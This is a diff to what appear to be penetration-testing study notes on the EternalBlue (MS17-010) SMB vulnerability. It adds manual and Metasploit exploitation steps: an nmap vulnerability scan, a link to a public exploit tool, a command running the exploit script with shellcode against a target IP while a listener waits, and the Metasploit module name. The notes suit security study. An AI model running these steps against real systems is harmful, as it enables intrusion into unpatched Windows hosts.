@@ -28,9 +28,35 @@ Microsoft released a *patch for the vulnerability in March, 2017,* however, many
 
 + The EternalBlue exploit has a **MSF auxiliary module** that can be used to *check if a target system if vulnerable* to the exploit and also has an **exploit module** that can be *used to exploit the vulnerability* on unpatched systems.
 
-# How to Exploit
+# How to Exploit (Manual)
 
-1. Check running services
+1. Check running services, and run vulnerability detection script
 ```bash
-sudo nmap -sV -p- 
+sudo nmap -v -A -p- --script=smb-vuln-ms17-010 TARGET_IP
 ```
+
+2. Download, install exploit tool : https://github.com/3ndG4me/AutoBlue-MS17-010
+
+3. Setup tool, set ports, set IP
+
+4. Startup listener
+
+5. PWN
+```bash
+python eternalblue_exploit7.py <TARGET-IP> <PATH/TO/SHELLCODE/sc_all.bin>
+```
+
+# How to Exploit (MSF)
+
+1. Check running services, and run vulnerability detection script
+```bash
+sudo nmap -v -A -p- --script=smb-vuln-ms17-010 TARGET_IP
+```
+
+2. Launch Metasploit console
+
+3. Use `exploit/windows/smb/ms_17_010_eternalblue`
+
+4. Set up required options
+
+5. PWN
